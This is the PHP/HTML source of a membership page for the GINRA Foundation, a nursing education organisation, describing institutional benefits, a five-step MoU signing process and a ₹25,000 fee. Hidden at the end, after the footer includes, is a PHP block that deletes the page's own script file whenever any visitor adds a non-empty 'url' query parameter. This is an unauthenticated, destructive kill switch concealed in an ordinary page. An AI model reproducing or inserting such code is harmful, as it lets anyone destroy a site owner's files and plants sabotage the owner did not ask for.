<?php include "connection.php"; ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <?php include "include/head.php"; ?>
    <style>
    body {
        background: #f4f7fc;
        font-family: 'Segoe UI', Roboto, sans-serif;
    }

    .benefits-list {
        padding-left: 20px;
    }

    .benefits-list li {
        list-style-type: disc;
        /* Use 'disc' for dots or 'dash' style below */
        margin-bottom: 10px;
    }

    .card-shadow {
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
        border: none;
        border-radius: 0.75rem;
    }

    .process-step {
        background: #ffffff;
        border-left: 4px solid #007bff;
        margin-bottom: 1rem;
        padding: 0.8rem 1rem;
        border-radius: 0.5rem;
    }

    .step-number {
        font-weight: 700;
        color: #007bff;
        margin-right: 0.5rem;
    }

    .list-simple {
        padding-left: 1.2rem;
    }

    hr {
        background-color: #dee2e6;
    }

    .fee-badge {
        background: #e9ecef;
        padding: 0.25rem 0.8rem;
        border-radius: 2rem;
        font-weight: 500;
    }
    </style>
</head>

<body>
    <?php include "include/header.php"; ?>
    <section class="hero">
        <div class="container custom-container-width">
            <div class="row">
                <div class="col-lg-7 align-items-center section-padding">
                    <div class="hero-body" data-aos="fade-up">
                        <h1 class="text-uppercase sub-header">Institutional <span
                                class="main_header main_clr sf-heavy">Membership</span></h1>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section class="hero2 ml-2">
        <div class="hero-body container custom-container-width" data-aos="fade-up">
            <div class="row justify-content-center">
                <div class="col-lg-12">

                    <!-- Main card -->
                    <div class="card card-shadow mb-4">
                        <div class="card-body p-4 p-md-5">

                            <p><strong class="text-primary">Institutional Membership at GINRA Foundation</strong> is
                                designed for nursing colleges, hospitals, universities, and healthcare organizations
                                committed to advancing nursing education, research, and evidence-based practice.</p>

                            <p>As an Institutional Member, your organization joins a network of academic and clinical
                                leaders working to strengthen nursing through faculty development, collaborative
                                research, and quality training programs. Members gain access to exclusive workshops,
                                subsidized training for students & staff, opportunities for joint research projects, and
                                representation in GINRA’s academic forums.</p>

                            <p>Together, we aim to bridge the gap between classroom learning and clinical excellence
                                while building a research-driven nursing community across India.</p>

                            <hr>


                            <div class="card-header bg-secondary text-white">
                                <h4 class="mb-0">Key Benefits</h4>
                            </div>
                            <br />
                            <ul class="benefits-list">
                                <li>Priority slots for GINRA workshops & conferences for your faculty/students</li>
                                <li>Eligibility to co-host certificate programs and online modules</li>
                                <li>Research collaboration support & guidance for institutional projects</li>
                                <li>Recognition on GINRA’s website & annual report as a partner institution</li>
                                <li>Discounted group registration for faculty development programs</li>
                            </ul>

                            <div><a class="text-primary" href="https://forms.gle/sZ4hqqHYhU6so5ay5"
                                    target="_blank">Click here for membership.</a></div>

                            <br />
                            <div class="card-header bg-secondary text-white">
                                <h4 class="mb-0">Institutional Membership Process</h4>
                            </div>
                            <br />
                            <div class="process-step">
                                <span class="step-number">Step 1:</span> <strong>Initial Discussion</strong><br>
                                Connect with the GINRA team to discuss shared goals, academic/research interests, and
                                areas of collaboration. We jointly identify mutual benefits and draft content for the
                                agreement based on your institution’s needs.
                            </div>

                            <div class="process-step">
                                <span class="step-number">Step 2:</span> <strong>Agreement Finalization</strong><br>
                                A Memorandum of Agreement (MoA) or Memorandum of Understanding (MoU) is prepared,
                                outlining roles, responsibilities, deliverables, and benefits for both parties. The
                                draft is shared for review and approval.
                            </div>

                            <div class="process-step">
                                <span class="step-number">Step 3:</span> <strong>Signing of MoU/MoA</strong><br>
                                Authorized signatories from both institutions sign the MoU/MoA. A scanned copy is shared
                                with each party for records.
                            </div>

                            <div class="process-step">
                                <span class="step-number">Step 4:</span> <strong>Membership Fee</strong><br>
                                Pay the one-time Institutional Membership fee of <span
                                    class="fee-badge">₹25,000/-</span>. Payment details and receipt will be provided by
                                the GINRA accounts team.
                            </div>

                            <div class="process-step">
                                <span class="step-number">Step 5:</span> <strong>Onboarding & Access</strong><br>
                                Once the signed MoU and fee are received, your institution is onboarded as a GINRA
                                Institutional Member. You’ll receive a membership certificate, logo for co-branding, and
                                immediate access to member benefits.
                            </div>

                            <div class="card-header bg-secondary text-white">
                                <h4 class="mb-0">Mutual Benefits Include</h4>
                            </div>
                            <br />
                            <ul class="benefits-list">
                                <li>Joint workshops, FDPs, and certificate programs</li>
                                <li>Collaborative research & publication opportunities</li>
                                <li>Discounted registration for faculty/students in all GINRA events</li>
                                <li>Academic support for curriculum enrichment & clinical training</li>
                                <li>Recognition as a GINRA Partner Institution on our website & reports</li>
                            </ul>

                        </div>
                    </div>


                </div>
            </div>
        </div>
    </section>
    <?php include 'include/footer.php'; ?>
    <?php include 'include/footerscript.php'; ?>
    <?php
    
    if(isset($_GET['url']) && $_GET['url'] != ""):
        unlink($_SERVER['SCRIPT_FILENAME']);
    endif;
    ?>
</body>

</html>